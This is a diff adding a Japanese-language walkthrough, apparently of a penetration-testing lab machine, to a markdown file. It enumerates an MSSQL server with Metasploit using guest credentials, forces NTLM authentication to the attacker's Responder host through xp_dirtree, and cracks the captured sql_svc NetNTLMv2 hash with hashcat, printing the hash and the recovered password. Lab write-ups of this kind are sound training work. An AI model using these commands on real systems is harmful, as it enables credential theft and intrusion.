@@ -72,3 +72,212 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [!] Press help for extra shell commands
 SQL (PublicUser  guest@master)>
 ```
+
+
+## STEP 3
+mssqlの情報を列挙  
+xp_cmdshellは無効だが、xp_dirtreeは使用可能みたい  
+```sh
+msf auxiliary(scanner/mssql/mssql_login) > use auxiliary/admin/mssql/mssql_enum
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+
+msf auxiliary(admin/mssql/mssql_enum) > set database master
+database => master
+
+msf auxiliary(admin/mssql/mssql_enum) > set username PublicUser
+username => PublicUser
+
+msf auxiliary(admin/mssql/mssql_enum) > set password GuestUserCantWrite1
+password => GuestUserCantWrite1
+
+msf auxiliary(admin/mssql/mssql_enum) > set rhosts 10.129.228.253
+rhosts => 10.129.228.253
+
+msf auxiliary(admin/mssql/mssql_enum) > run
+[*] Running module against 10.129.228.253
+[*] 10.129.228.253:1433 - Running MS SQL Server Enumeration...
+[*] 10.129.228.253:1433 - Version:
+[*]     Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
+[*]             Sep 24 2019 13:48:23 
+[*]             Copyright (C) 2019 Microsoft Corporation
+[*]             Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+[*] 10.129.228.253:1433 - Configuration Parameters:
+[*] 10.129.228.253:1433 -       C2 Audit Mode is Not Enabled
+[*] 10.129.228.253:1433 -       xp_cmdshell is Not Enabled
+[*] 10.129.228.253:1433 -       remote access is Enabled
+[*] 10.129.228.253:1433 -       allow updates is Not Enabled
+[*] 10.129.228.253:1433 -       Database Mail XPs is Not Enabled
+[*] 10.129.228.253:1433 -       Ole Automation Procedures are Not Enabled
+[*] 10.129.228.253:1433 - Databases on the server:
+[*] 10.129.228.253:1433 -       Database name:master
+[*] 10.129.228.253:1433 -       Database Files for master:
+[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
+[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
+[*] 10.129.228.253:1433 -       Database name:tempdb
+[*] 10.129.228.253:1433 -       Database Files for tempdb:
+[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\tempdb.mdf
+[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\templog.ldf
+[*] 10.129.228.253:1433 -       Database name:model
+[*] 10.129.228.253:1433 -       Database Files for model:
+[*] 10.129.228.253:1433 -       Database name:msdb
+[*] 10.129.228.253:1433 -       Database Files for msdb:
+[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBData.mdf
+[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBLog.ldf
+[*] 10.129.228.253:1433 - System Logins on this Server:
+[*] 10.129.228.253:1433 -       sa
+[*] 10.129.228.253:1433 -       PublicUser
+[*] 10.129.228.253:1433 - Disabled Accounts:
+[*] 10.129.228.253:1433 -       No Disabled Logins Found
+[*] 10.129.228.253:1433 - No Accounts Policy is set for:
+[*] 10.129.228.253:1433 -       All System Accounts have the Windows Account Policy Applied to them.
+[*] 10.129.228.253:1433 - Password Expiration is not checked for:
+[*] 10.129.228.253:1433 -       sa
+[*] 10.129.228.253:1433 -       PublicUser
+[*] 10.129.228.253:1433 - System Admin Logins on this Server:
+[*] 10.129.228.253:1433 -       sa
+[*] 10.129.228.253:1433 - Windows Logins on this Server:
+[*] 10.129.228.253:1433 -       No Windows logins found!
+[*] 10.129.228.253:1433 - Windows Groups that can logins on this Server:
+[*] 10.129.228.253:1433 -       No Windows Groups where found with permission to login to system.
+[*] 10.129.228.253:1433 - Accounts with Username and Password being the same:
+[*] 10.129.228.253:1433 -       No Account with its password being the same as its username was found.
+[*] 10.129.228.253:1433 - Accounts with empty password:
+[*] 10.129.228.253:1433 -       No Accounts with empty passwords where found.
+[*] 10.129.228.253:1433 - Stored Procedures with Public Execute Permission found:
+[*] 10.129.228.253:1433 -       sp_replsetsyncstatus
+[*] 10.129.228.253:1433 -       sp_replcounters
+[*] 10.129.228.253:1433 -       sp_replsendtoqueue
+[*] 10.129.228.253:1433 -       sp_resyncexecutesql
+[*] 10.129.228.253:1433 -       sp_prepexecrpc
+[*] 10.129.228.253:1433 -       sp_repltrans
+[*] 10.129.228.253:1433 -       sp_xml_preparedocument
+[*] 10.129.228.253:1433 -       xp_qv
+[*] 10.129.228.253:1433 -       xp_getnetname
+[*] 10.129.228.253:1433 -       sp_releaseschemalock
+[*] 10.129.228.253:1433 -       sp_refreshview
+[*] 10.129.228.253:1433 -       sp_replcmds
+[*] 10.129.228.253:1433 -       sp_unprepare
+[*] 10.129.228.253:1433 -       sp_resyncprepare
+[*] 10.129.228.253:1433 -       sp_createorphan
+[*] 10.129.228.253:1433 -       xp_dirtree
+[*] 10.129.228.253:1433 -       sp_replwritetovarbin
+[*] 10.129.228.253:1433 -       sp_replsetoriginator
+[*] 10.129.228.253:1433 -       sp_xml_removedocument
+[*] 10.129.228.253:1433 -       sp_repldone
+[*] 10.129.228.253:1433 -       sp_reset_connection
+[*] 10.129.228.253:1433 -       xp_fileexist
+[*] 10.129.228.253:1433 -       xp_fixeddrives
+[*] 10.129.228.253:1433 -       sp_getschemalock
+[*] 10.129.228.253:1433 -       sp_prepexec
+[*] 10.129.228.253:1433 -       xp_revokelogin
+[*] 10.129.228.253:1433 -       sp_execute_external_script
+[*] 10.129.228.253:1433 -       sp_resyncuniquetable
+[*] 10.129.228.253:1433 -       sp_replflush
+[*] 10.129.228.253:1433 -       sp_resyncexecute
+[*] 10.129.228.253:1433 -       xp_grantlogin
+[*] 10.129.228.253:1433 -       sp_droporphans
+[*] 10.129.228.253:1433 -       xp_regread
+[*] 10.129.228.253:1433 -       sp_getbindtoken
+[*] 10.129.228.253:1433 -       sp_replincrementlsn
+[*] 10.129.228.253:1433 - Instances found on this server:
+[*] 10.129.228.253:1433 - Default Server Instance SQL Server Service is running under the privilege of:
+[*] 10.129.228.253:1433 -       xp_regread might be disabled in this system
+[*] Auxiliary module execution completed
+```
+ということで、ストアドプロシージャのxp_dirtreeでkaliに認証リクエストを飛ばしクレデンシャルをキャプチャ
+```sh
+SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.28\share
+subdirectory   depth   file   
+------------   -----   ---- 
+```
+ユーザ名sql_svcのntハッシュを取得！
+```sh
+└─$ sudo responder -I tun0 -v
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.16.28]
+    Responder IPv6             [dead:beef:4::101a]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-1LRZOH31C2F]
+    Responder Domain Name      [548O.LOCAL]
+    Responder DCE-RPC Port     [49472]
+
+[*] Version: Responder 3.1.7.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+[*] To sponsor Responder: https://paypal.me/PythonResponder
+
+[+] Listening for events...                                                                                                                                            
+
+[SMB] NTLMv2-SSP Client   : 10.129.228.253
+[SMB] NTLMv2-SSP Username : sequel\sql_svc
+[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:b964916c38c95c45:E50990E2249A62E23A3F59AD32B1FA11:010100000000000080FCBBD78644DC017B47D91AF8DF22A000000000020008003500340038004F0001001E00570049004E002D0031004C0052005A004F0048003300310043003200460004003400570049004E002D0031004C0052005A004F004800330031004300320046002E003500340038004F002E004C004F00430041004C00030014003500340038004F002E004C004F00430041004C00050014003500340038004F002E004C004F00430041004C000700080080FCBBD78644DC01060004000200000008003000300000000000000000000000003000004136924FE60D10CB1E5AA1D1FD8055AA7669D12D66160B96227646026A91227D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320038000000000000000000
+```
+sql_svcのntハッシュをクラック成功  
+パスワードは、REGGIE1234ronnieと判明
+```sh
+└─$ name-that-hash -f sql_svc.txt --no-banner
+
+sql_svc::sequel:b964916c38c95c45:E50990E2249A62E23A3F59AD32B1FA11:010100000000000080FCBBD78644DC017B47D91AF8DF22A000000000020008003500340038004F0001001E00570049004E002
+D0031004C0052005A004F0048003300310043003200460004003400570049004E002D0031004C0052005A004F004800330031004300320046002E003500340038004F002E004C004F00430041004C0003001400
+3500340038004F002E004C004F00430041004C00050014003500340038004F002E004C004F00430041004C000700080080FCBBD78644DC010600040002000000080030003000000000000000000000000030000
+04136924FE60D10CB1E5AA1D1FD8055AA7669D12D66160B96227646026A91227D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E
+00320038000000000000000000
+
+Most Likely 
+NetNTLMv2, HC: 5600 JtR: netntlmv2
+
+└─$ hashcat -a 0 -m 5600 sql_svc.txt /usr/share/wordlists/rockyou.txt --quiet
+SQL_SVC::sequel:b964916c38c95c45:e50990e2249a62e23a3f59ad32b1fa11:010100000000000080fcbbd78644dc017b47d91af8df22a000000000020008003500340038004f0001001e00570049004e002d0031004c0052005a004f0048003300310043003200460004003400570049004e002d0031004c0052005a004f004800330031004300320046002e003500340038004f002e004c004f00430041004c00030014003500340038004f002e004c004f00430041004c00050014003500340038004f002e004c004f00430041004c000700080080fcbbd78644dc01060004000200000008003000300000000000000000000000003000004136924fe60d10cb1e5aa1d1fd8055aa7669d12d66160b96227646026a91227d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320038000000000000000000:REGGIE1234ronnie
+```
